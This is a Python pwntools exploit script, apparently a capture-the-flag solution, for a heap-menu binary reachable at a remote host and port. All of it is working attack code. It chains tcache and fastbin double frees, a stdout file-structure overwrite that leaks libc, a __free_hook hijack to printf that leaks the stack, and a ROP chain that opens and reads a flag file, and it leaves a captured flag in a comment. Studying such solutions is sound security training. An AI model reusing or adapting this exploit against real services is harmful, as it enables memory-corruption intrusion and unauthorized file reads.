#!/usr/bin/python

from pwn import *

PATH = './chall'

GDBSCRIPT = '''

'''

HOST = '103.152.242.172'
PORT = 40902


def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])

def create(size, data):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', f'{size}')
    r.sendafter(': ', data)

def delete(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', f'{idx}')

def syscall(rdi, rsi, rdx, rax):
    payload  = p64(libc.sym['pop_rax']) + p64(rax)
    payload += p64(libc.sym['pop_rdi']) + p64(rdi)
    payload += p64(libc.sym['pop_rsi']) + p64(rsi)
    payload += p64(libc.sym['pop_rdx_r12']) + p64(rdx) + p64(0)
    payload += p64(libc.sym['syscall'])
    return payload


def exploit(r):
    # 0 - 6
    for _ in range(7):
        create(0x50, 'AAAAAAAA')

    # 7 - 13
    for _ in range(7):
        create(0x80, 'AAAAAAAA')

    create(0x50, 'AAAAAAAA') # 14
    create(0x80, 'AAAAAAAA') # 15
    create(0x50, 'AAAAAAAA') # 16
    create(0x50, 'AAAAAAAA') # 17

    for _ in range(7):
        delete(_)

    delete(17)
    delete(14)
    delete(16)
    delete(17)

    for i in range(7, 14):
        delete(i)

    delete(15)
    create(0x30, '\xa0\x86')

    for _ in range(7):
        create(0x50, 'AAAAAAAA')

    create(0x50, '\x80')
    create(0x50, 'AAAAAAAA')
    create(0x50, 'AAAAAAAA')
    create(0x50, 'AAAAAAAA')

    try:
        create(0x50, p64(0xfbad1800) + p64(0) + p64(0) + p64(0) + b'\x08')

        _IO_2_1_stdin_ = u64(r.recvline(0)[:8])
        libc.address = _IO_2_1_stdin_ - libc.sym['_IO_2_1_stdin_']

        info(f'_IO_2_1_stdin_ 0x{_IO_2_1_stdin_:x}')

        if _IO_2_1_stdin_ >> 44 != 0x7:
            r.close()
            exit()

        info(f'libc.address   0x{libc.address:x}')

        # 31 - 37
        for _ in range(7):
            create(0x60, 'BBBBBBBB')

        create(0x60, 'BBBBBBBB') # 38
        create(0x60, 'BBBBBBBB') # 39

        for i in range(31, 38):
            delete(i)

        delete(38)
        delete(39)
        delete(38)

        for _ in range(7):
            create(0x60, 'BBBBBBBB')

        create(0x60, p64(libc.sym['__free_hook']))
        create(0x60, 'BBBBBBBB')
        create(0x60, '%p||%6$p||') # 49

        # 50 - 56
        for _ in range(7):
            create(0x70, 'CCCCCCCC')

        create(0x70, 'CCCCCCCC') # 57
        create(0x70, 'CCCCCCCC') # 58

        for i in range(50, 57):
            delete(i)

        delete(57)
        delete(58)
        delete(57)

        for _ in range(7):
            create(0x70, 'BBBBBBBB')

        create(0x60, p64(libc.sym['printf']))

        delete(49)

        leaks = r.recvline(0).split(b'||')
        pie   = int(leaks[0], 16)
        stack = int(leaks[1], 16)

        info(f'pie (not used) 0x{pie:x}')
        info(f'stack_leak     0x{stack:x}')

        after_create = stack - 0x38

        create(0x70, p64(after_create))
        create(0x70, 'BBBBBBBB')
        create(0x70, 'BBBBBBBB')

        payload = syscall(0, stack + 24, 0x200, rax=0)

        pause()

        create(0x70, payload)

        file_path_ptr = stack + 0x108

        payload = syscall(file_path_ptr, 0, 0, rax=2)
        # payload += syscall(5, file_path_ptr, 0x100, rax=78)
        payload += syscall(5, file_path_ptr, 0x100, rax=0)
        payload += syscall(1, file_path_ptr, 0x100, rax=1)

        pause()

        # technofair{Welc0m3_back_h34ppy_n1nj4A_here_1s_whAt_you_are_looOking_for}
        r.sendline(payload + b'flag_07srGoeMn0mlRmC3.txt\0')

        r.interactive()

    except:
        r.close()



if __name__ == '__main__':
    elf  = ELF(PATH)
    libc = ELF('./libc.so.6', False)

    libc.sym['pop_rsi']     = 0x027529 # pop rsi; ret;
    libc.sym['pop_rdx_r12'] = 0x11c371 # pop rdx; pop r12; ret;
    libc.sym['pop_rdi']     = 0x142dda # pop rdi; ret;
    libc.sym['pop_rax']     = 0x04a550 # pop rax; ret;
    libc.sym['syscall']     = 0x066229 # syscall; ret;

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(PATH, aslr=0)
    exploit(r)
